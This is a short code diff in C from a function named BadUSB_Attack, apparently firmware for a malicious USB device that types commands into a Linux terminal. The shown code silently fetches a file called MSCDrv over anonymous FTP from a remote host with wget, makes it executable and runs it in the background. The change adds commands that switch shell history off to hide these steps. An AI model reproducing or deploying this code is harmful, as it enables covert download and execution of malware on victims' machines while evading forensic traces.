@@ -199,12 +199,14 @@ void BadUSB_Attack(int stage){
 		strcat(AttackStr0, "wget -q ftp://anonymous:@");
 		strcat(AttackStr0, File_Host_Addr);
 		strcat(AttackStr0, "/MSCDrv >/dev/null 2>&1 &\n");
+		strcat(AttackStr0, "set -o history\n");
 		strcat(AttackStr0, "exit\n");
 		SimulateShortcutKey(Terminal, 3);
 		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 	}else if(stage == 1){
 		uint8_t Terminal[3] = LinuxTerminal;
 		char AttackStr1[256] = {'\0'};
+		strcat(AttackStr1, "set +o history\n");
 		strcat(AttackStr1, "cd /home/user/Templates\n");
 		strcat(AttackStr1, "chmod 777 MSCDrv\n");
 		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
